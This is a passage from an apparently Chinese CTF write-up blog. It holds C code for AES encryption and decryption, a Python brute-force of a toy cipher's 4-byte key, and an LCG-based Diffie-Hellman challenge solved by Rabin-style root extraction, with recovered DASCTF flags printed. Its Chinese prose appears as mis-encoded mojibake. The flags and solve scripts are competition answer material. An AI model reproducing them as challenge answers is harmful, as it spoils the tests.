<span class="hljs-number">0x90</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x7F</span>, <br>    <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xFA</span><br> <br>         &#125;,<br>PlainText2[<span class="hljs-number">48</span>] = &#123;   <span class="hljs-number">0x71</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xFC</span>, <br>    <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x7F</span>, <br>    <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xFA</span><br>  &#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> CipherKey_word[<span class="hljs-number">44</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; CipherKey_word[i++] = CharToWord(CipherKey, <span class="hljs-number">4</span> * i));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å¯†é’¥ï¼š&quot;</span>);<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; k++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2X &quot;</span>, CipherKey[k]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\næ˜æ–‡ï¼š&quot;</span>);<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; k++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X &quot;</span>, PlainText[k]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n**************å¼€å§‹åŠ å¯†****************&quot;</span>);<br>AddRoundKey(PlainText, CipherKey);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++)<br>&#123;<br>SubBytes(PlainText, PlainText1, <span class="hljs-number">16</span>);<span class="hljs-comment">/*S ç›’ç½®æ¢ */</span><br>ShiftRows(PlainText1);<span class="hljs-comment">/* è¡Œç§»ä½ */</span><br>MixColumns(PlainText1, PlainText2);<span class="hljs-comment">/* åˆ—æ··æ·† */</span><br>ExtendCipherKey(CipherKey_word + <span class="hljs-number">4</span> * i, i);<span class="hljs-comment">/* å­å¯†é’¥ç”Ÿæˆ */</span><br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++)  WordToChar(CipherKey_word[k + <span class="hljs-number">4</span> * (i + <span class="hljs-number">1</span>)], CipherKey + <span class="hljs-number">4</span> * k);<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; k++)  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X &quot;</span>, CipherKey[k]);<br>AddRoundKey(PlainText2, CipherKey);<span class="hljs-comment">/* è½®å¯†é’¥åŠ  */</span><br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; k++)  PlainText[k] = PlainText2[k];<br>&#125;<br><br>SubBytes(PlainText, PlainText1, <span class="hljs-number">16</span>);<br>ShiftRows(PlainText1);<br>ExtendCipherKey(CipherKey_word + <span class="hljs-number">4</span> * i, i);<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>;WordToChar(CipherKey_word[k + <span class="hljs-number">4</span> * (i + <span class="hljs-number">1</span>)], CipherKey + <span class="hljs-number">4</span> * k), k++);<br>AddRoundKey(PlainText1, CipherKey);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\næœ€ç»ˆAESåŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š&quot;</span>);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X &quot;</span>, PlainText1[i]);<br> <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>    &#123;<br>    PlainText1[i]=mm[i+<span class="hljs-number">16</span>];   <span class="hljs-comment">// è§£å¯†ç¬¬äºŒæ®µç¬¬ä¸‰æ®µåç§» 16ï¼Œ32 å³å¯</span><br>    &#125;<br>    <br> <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n**************å¼€å§‹è§£å¯†***************&quot;</span>);<br>AddRoundKey(PlainText1, CipherKey);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++)<br>&#123;<br>    SubBytesRe(PlainText1, PlainText, <span class="hljs-number">16</span>);<span class="hljs-comment">/*S ç›’ç½®æ¢ */</span><br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; WordToChar(CipherKey_word[k + <span class="hljs-number">40</span> - <span class="hljs-number">4</span> * (i + <span class="hljs-number">1</span>)], CipherKey + <span class="hljs-number">4</span> * k),k++);<span class="hljs-comment">/* å­å¯†é’¥ç”Ÿæˆ */</span><br>ShiftRowsRe(PlainText);<span class="hljs-comment">/* è¡Œç§»ä½é€† */</span><br>AddRoundKey(PlainText, CipherKey);<span class="hljs-comment">/* è½®å¯†é’¥åŠ  */</span><br>MixColumnsRe(PlainText);<span class="hljs-comment">/* åˆ—æ··æ·†é€†è¿ç®— */</span><br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>;PlainText1[k] = PlainText[k],k++);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\næœ€åä¸€æ¬¡å¾ªç¯ï¼š&quot;</span>);<br>ShiftRowsRe(PlainText);<span class="hljs-comment">/* è¡Œç§»ä½é€† */</span><br>SubBytesRe(PlainText, PlainText1, <span class="hljs-number">16</span>);<span class="hljs-comment">/*S ç›’ç½®æ¢ */</span><br>AddRoundKey(PlainText1, CipherKey1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\næœ€ç»ˆAESè§£å¯†åçš„æ˜æ–‡ä¸ºï¼š&quot;</span>);<br>   <br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,getcc( PlainText1[i]));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åçš„flagï¼šffYffnfffff6rfffKBf|KLfzfx-CfFffffffWfffmfffff~f</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Mycode"><a href="#Mycode" class="headerlink" title="Mycode"></a>Mycode</h2><p>åŠ è§£å¯†è„šæœ¬éƒ½å†™å¥½äº†ï¼Œç›´æ¥fromhexç„¶åçˆ†ç ´å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">substitute</span>(<span class="hljs-params">state, sub_box</span>):<br>    <span class="hljs-keyword">return</span> [sub_box[b &amp; <span class="hljs-number">0xF</span>] | (sub_box[(b &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xF</span>] &lt;&lt; <span class="hljs-number">4</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> state]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_round_keys</span>(<span class="hljs-params">base_key, rounds</span>):<br>    round_keys = []<br>    temp_key = base_key<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        round_keys.append(temp_key &amp; <span class="hljs-number">0xFFFFFFFF</span>)<br>        temp_key ^= ((temp_key &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>) | ((temp_key &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>)<br>    <span class="hljs-keyword">return</span> round_keys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_state</span>(<span class="hljs-params">base_key, state, rounds, encrypt</span>):<br>    sub_box = [<span class="hljs-number">0x9</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0xD</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0xF</span>, <span class="hljs-number">0x7</span>]<br>    inv_sub_box = [<span class="hljs-number">0xA</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xF</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0xD</span>, <span class="hljs-number">0xE</span>]<br><br>    round_keys = generate_round_keys(base_key, rounds)<br><br>    <span class="hljs-keyword">if</span> encrypt:<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">round</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>            state = substitute(state, sub_box)<br>            state = [s ^ ((round_keys[<span class="hljs-built_in">round</span>] &gt;&gt; (i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> i, s <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(state)]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">round</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            state = [s ^ ((round_keys[<span class="hljs-built_in">round</span>] &gt;&gt; (i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> i, s <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(state)]<br>            state = substitute(state, inv_sub_box)<br><br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plaintext, key, rounds=<span class="hljs-number">10</span></span>):<br>    length = <span class="hljs-built_in">len</span>(plaintext)<br>    padded_length = length <span class="hljs-keyword">if</span> length % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> length + (<span class="hljs-number">4</span> - (length % <span class="hljs-number">4</span>))<br>    plaintext += <span class="hljs-string">b&#x27;\x00&#x27;</span> * (padded_length - length)<br><br>    ciphertext = <span class="hljs-built_in">bytearray</span>(padded_length)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, padded_length, <span class="hljs-number">4</span>):<br>        state = <span class="hljs-built_in">list</span>(plaintext[i:i+<span class="hljs-number">4</span>])<br>        state = process_state(key, state, rounds, <span class="hljs-literal">True</span>)<br>        ciphertext[i:i+<span class="hljs-number">4</span>] = state<br><br>    <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key, rounds=<span class="hljs-number">10</span></span>):<br>    length = <span class="hljs-built_in">len</span>(ciphertext)<br>    plaintext = <span class="hljs-built_in">bytearray</span>(length)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, length, <span class="hljs-number">4</span>):<br>        state = <span class="hljs-built_in">list</span>(ciphertext[i:i+<span class="hljs-number">4</span>])<br>        state = process_state(key, state, rounds, <span class="hljs-literal">False</span>)<br>        plaintext[i:i+<span class="hljs-number">4</span>] = state<br><br>    <span class="hljs-keyword">return</span> plaintext.rstrip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment"># def main():</span><br><span class="hljs-comment">#     plaintext = b&quot;DASCTF&#123;******&#125;&quot;</span><br><span class="hljs-comment">#     key = 0xECB... # 4 bytes</span><br><span class="hljs-comment">#     ciphertext = encrypt(plaintext, key)</span><br><span class="hljs-comment">#     print(&quot;Ciphertext:&quot;, &#x27;&#x27;.join(f&quot;&#123;b:02X&#125;&quot; for b in ciphertext))</span><br><br><br>Ciphertext=<span class="hljs-string">&#x27;A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401&#x27;</span><br>Ciphertext=<span class="hljs-built_in">bytes</span>.fromhex(Ciphertext)<br><span class="hljs-built_in">print</span>(Ciphertext)<br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xECB00000</span>,<span class="hljs-number">0xECBFFFFF</span>):<br>    out=decrypt(Ciphertext,key)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;DASCTF&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-built_in">print</span>(key)<br>        <span class="hljs-built_in">print</span>(out)<br><br><span class="hljs-comment">#DASCTF&#123;6ef4d8e1-845a-4e3c-a4e1-a15e5530a0f4&#125;</span><br></code></pre></td></tr></table></figure><h2 id="DlcgH-1"><a href="#DlcgH-1" class="headerlink" title="DlcgH-1"></a>DlcgH-1</h2><p>çœ‹åˆ°é¢˜ç›®çš„æ—¶å€™ç¡®å®æ…Œäº†ï¼Œkå’Œtéƒ½æ˜¯512ä½ï¼Œçˆ†ç ´ä¸ç°å®ï¼Œåˆæƒ³åˆ°DHç®—æ³•æœ¬èº«å¹¶ä¸ä¼šï¼Œæ‰€ä»¥ä¹Ÿæ²¡åšè¿‡å¤šå°è¯•å°±è¿”å›å»çœ‹reäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;DASCTF&#123;******&#125;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">iterate_function</span>(<span class="hljs-params">seed, coeff_a, coeff_b, prime_modulus</span>):<br>    <span class="hljs-keyword">return</span> (coeff_a * seed + coeff_b) % prime_modulus<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">iterate_multiple_times</span>(<span class="hljs-params">seed, num_iterations, coeff_a, coeff_b, prime_modulus</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_iterations):<br>        seed = iterate_function(seed, coeff_a, coeff_b, prime_modulus)<br>    <span class="hljs-keyword">return</span> seed<br><br>p = getPrime(<span class="hljs-number">600</span>)<br>a = getPrime(<span class="hljs-number">512</span>)<br>b = getPrime(<span class="hljs-number">512</span>)<br>s = getPrime(<span class="hljs-number">512</span>)<br>k = getPrime(<span class="hljs-number">512</span>)<br>t = getPrime(<span class="hljs-number">512</span>)<br><br>A = iterate_multiple_times(s, k, a, b, p)<br>B = iterate_multiple_times(s, t, a, b, p)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p =&quot;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a =&quot;</span>, a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;b =&quot;</span>, b)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;s =&quot;</span>, s)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A =&quot;</span>, A)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;B =&quot;</span>, B)<br><br>secret1 = iterate_multiple_times(A, k, a, b, p)<br>secret2 = iterate_multiple_times(B, t, a, b, p)<br><br><span class="hljs-keyword">assert</span> secret1 == secret2<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 2565258348684709722726260231955260453241716968378483821594041597297293609376806025180965681289016169408781752953380586044352169083397987333072306444539318806255242559916564022662479</span><br><span class="hljs-string">a = 7703427441632069990122897903141278700284019287330080801753208940444135129072547305259960648105321270085533531118395452229965873504176368162947864923497711</span><br><span class="hljs-string">b = 8477265953761650860710068507342719089504862957398782381045770264963932696457722724393775545810962476516315838411812248360284564925846788951219272632661157</span><br><span class="hljs-string">s = 9228773209718156231041982890745928246648483643042884535935071957475932603607283209094294685862893340598940862096657878372229519375655468524041406914666867</span><br><span class="hljs-string">A = 434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span><br><span class="hljs-string">B = 434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p2 = next_prime(secret1)<br>q2 = getPrime(<span class="hljs-number">600</span>)<br>n2 = p2*q2<br>e = <span class="hljs-number">4</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n2 =&quot;</span>, n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, c)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n2 = 3241139665583501598296135149075754735041636843305130049654913708275571916563715101898946962033698805416493133339619007016676895968314902474922279948997540924678346952667095320094789476561995339618782687993966133770687551933070478999383821269223854568552819152909266096733330218505088222661907600152055916956562332379930822529724151378274932991887183193175206749</span><br><span class="hljs-string">c = 1131281812215293796960536920068009435705926803182047772347743960804329656316689664084120353862091370978145286943689311985878028828902275260824388998300548644880722651153603738691769179255824425771260974588160589473958033612303767050773921373389315920529311000160530833707622310013322631917184737227893101365726934901652170763292132835433158093074003616578836411</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>èµ›åçœ‹åˆ°wpå‘ç°å¯ä»¥çˆ†ç ´kï¼Œæ€ä¹ˆæƒ³éƒ½ä¸ç°å®ï¼Œä½†æ˜¯åˆ«äººèƒ½å‡ºå°±è¯¥æƒ³æƒ³åŸæœ¬ä¸ç°å®çš„æ–¹æ³•ï¼Œç®—å‡ºpå’Œqï¼Œåæ¥æƒ³æƒ³%på…¶å®å¯ä»¥å¾ªç¯</p><p>å‘ç°eå’Œphiä¸äº’ç´ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">p=<span class="hljs-number">1472490340321845700492870656866629756386520746748019952980831685935628618084832981576756885932019702470337632472478610542460495595381421112792242654382213433012352298291319463142659</span><span class="hljs-comment"># n = 3241139665583501598296135149075754735041636843305130049654913708275571916563715101898946962033698805416493133339619007016676895968314902474922279948997540924678346952667095320094789476561995339618782687993966133770687551933070478999383821269223854568552819152909266096733330218505088222661907600152055916956562332379930822529724151378274932991887183193175206749</span><br>c = <span class="hljs-number">1131281812215293796960536920068009435705926803182047772347743960804329656316689664084120353862091370978145286943689311985878028828902275260824388998300548644880722651153603738691769179255824425771260974588160589473958033612303767050773921373389315920529311000160530833707622310013322631917184737227893101365726934901652170763292132835433158093074003616578836411</span><br>e = <span class="hljs-number">4</span><br>q=<span class="hljs-number">2201127964530536768531437690590447485511044947862563552674657770394302822371223893779621142446998848918986248500749184930380894798831854267120305815092270548187578354416455278612511</span><br>R.&lt;x&gt; = PolynomialRing(GF(p))<br>f1 = x^<span class="hljs-number">4</span> - c<br>res1 = f1.roots()<br>R.&lt;x&gt; = PolynomialRing(GF(q))<br>f2 = x^<span class="hljs-number">4</span> - c<br>res2 = f2.roots()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res2:<br>        m = crt([<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(j[<span class="hljs-number">0</span>])],[p,q])<br>        <span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>å½“ç„¶å‘ç°på’Œqéƒ½%4&#x3D;3ï¼Œä¹Ÿå°±æ˜¯ç”¨rabinè§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">2565258348684709722726260231955260453241716968378483821594041597297293609376806025180965681289016169408781752953380586044352169083397987333072306444539318806255242559916564022662479</span><br>a = <span class="hljs-number">7703427441632069990122897903141278700284019287330080801753208940444135129072547305259960648105321270085533531118395452229965873504176368162947864923497711</span><br>b = <span class="hljs-number">8477265953761650860710068507342719089504862957398782381045770264963932696457722724393775545810962476516315838411812248360284564925846788951219272632661157</span><br>s = <span class="hljs-number">9228773209718156231041982890745928246648483643042884535935071957475932603607283209094294685862893340598940862096657878372229519375655468524041406914666867</span><br>A = <span class="hljs-number">434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span><br>B = <span class="hljs-number">434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span><br>n = <span class="hljs-number">3241139665583501598296135149075754735041636843305130049654913708275571916563715101898946962033698805416493133339619007016676895968314902474922279948997540924678346952667095320094789476561995339618782687993966133770687551933070478999383821269223854568552819152909266096733330218505088222661907600152055916956562332379930822529724151378274932991887183193175206749</span><br>c = <span class="hljs-number">1131281812215293796960536920068009435705926803182047772347743960804329656316689664084120353862091370978145286943689311985878028828902275260824388998300548644880722651153603738691769179255824425771260974588160589473958033612303767050773921373389315920529311000160530833707622310013322631917184737227893101365726934901652170763292132835433158093074003616578836411</span><br>e=<span class="hljs-number">4</span><br><br>seed=s<br>k=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> seed!=A:<br>    seed=(seed*a+b)%p<br>    k+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(k)<br><br>seed=A<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12345</span>):<br>    seed=(seed*a+b)%p<br>p=next_prime(seed)<br><span 